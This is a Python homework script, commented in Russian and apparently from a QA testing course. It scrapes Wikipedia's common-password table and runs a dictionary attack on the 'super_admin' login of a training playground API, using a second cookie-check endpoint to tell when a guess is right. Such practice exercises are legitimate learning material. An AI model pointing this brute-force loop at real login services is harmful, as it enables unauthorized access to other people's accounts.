# Сегодня к нам пришел наш коллега и сказал, что забыл свой пароль от важного сервиса. Он просит нас помочь ему написать программу, которая подберет его пароль.
# Условие следующее. Есть метод: https://playground.learnqa.ru/ajax/api/get_secret_password_homework
import requests

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
# Его необходимо вызывать POST-запросом с двумя параметрами: login и password
# Если вызвать метод без поля login или указать несуществующий login, метод вернет 500
# Если login указан и существует, метод вернет нам авторизационную cookie с названием auth_cookie и каким-то значением.
login = 'test'
password = 'pass'
response = requests.post(url, data={"login": login, "password": password})
print(response.status_code)
print(response.text)
print(dict(response.cookies))
# У метода существует защита от перебора. Если верно указано поле login, но передан неправильный password,
# то авторизационная cookie все равно вернется. НО с "неправильным" значением, которое на самом деле не позволит создавать авторизованные запросы. Только если и login, и password указаны верно, вернется cookie с "правильным" значением.
# Таким образом используя только метод get_secret_password_homework невозможно узнать, передали ли мы верный пароль или нет.
response = requests.post(url, data={"login": "super_admin", "password": password})
print(response.status_code)
print(response.text)
print(dict(response.cookies))
cookies = dict(response.cookies)
# По этой причине нам потребуется второй метод, который проверяет правильность нашей авторизованной cookie: https://playground.learnqa.ru/ajax/api/check_auth_cookie
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
# Если вызвать его без cookie с именем auth_cookie или с cookie, у которой выставлено "неправильное" значение, метод вернет фразу "You are NOT authorized".
# Если значение cookie “правильное”, метод вернет: “You are authorized”
response = requests.post(url_check_cookie, cookies=cookies)
print(response.status_code)
print(response.text)
print('-----------------\n\n\n')
login = 'super_admin'
# Коллега говорит, что точно помнит свой login - это значение super_admin
# А вот пароль забыл, но точно помнит, что выбрал его из списка самых популярных паролей на Википедии (вот тебе и супер админ...).
# Ссылка: https://en.wikipedia.org/wiki/List_of_the_most_common_passwords
# Искать его нужно среди списка Top 25 most common passwords by year according to SplashData
import bs4
import requests

url_wiki = 'https://en.wikipedia.org/wiki/List_of_the_most_common_passwords'
r = requests.get(url_wiki)
r.encoding = 'utf-8'
b = bs4.BeautifulSoup(r.text, 'html.parser')
my_list = list()
for i in range(2, 27):
    for j in range(2, 11):
        atitles = (b.select(f'#mw-content-text > div.mw-parser-output > table:nth-child(10) > tbody > tr:nth-child({i}) > td:nth-child({j})'))
        my_list.append(atitles[0].text.strip())

for item in my_list:
    if item.find('[a]') != -1:
        my_list.remove(item)
        my_list.append(item[:-3])

# Итак, наша задача - написать скрипт и указать в нем login нашего коллеги и все пароли из Википедии в виде списка. Программа должна делать следующее:
url_check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"
response = requests.post(url_check_cookie, cookies=cookies)
# 1. Брать очередной пароль и вместе с логином коллеги вызывать первый метод get_secret_password_homework. В ответ метод будет возвращать авторизационную cookie с именем auth_cookie и каким-то значением.

data = {"login": "super_admin", "password": "test"}
i = 0
while i < len(my_list):
    data["password"] = my_list[i]
    #print(data)
    #print(f'Пробую пароль {data["password"]}')
    response = requests.post(url, data=data)
    #print(dict(response.cookies))
    cookies = dict(response.cookies)
    #print(cookies)
    response = requests.post(url_check_cookie, cookies=cookies)
    #print(response.text)
    if response.text != 'You are NOT authorized':
        print(f'password = {data["password"]}')
        print(f'response_text = {response.text}')
        break
    #print('----------')
    i += 1
# 2. Далее эту cookie мы должна передать во второй метод check_auth_cookie. Если в ответ вернулась фраза "You are NOT authorized", значит пароль неправильный. В этом случае берем следующий пароль и все заново. Если же вернулась другая фраза - нужно, чтобы программа вывела верный пароль и эту фразу.
#
# Ответом к задаче должен быть верный пароль и ссылка на коммит со скриптом.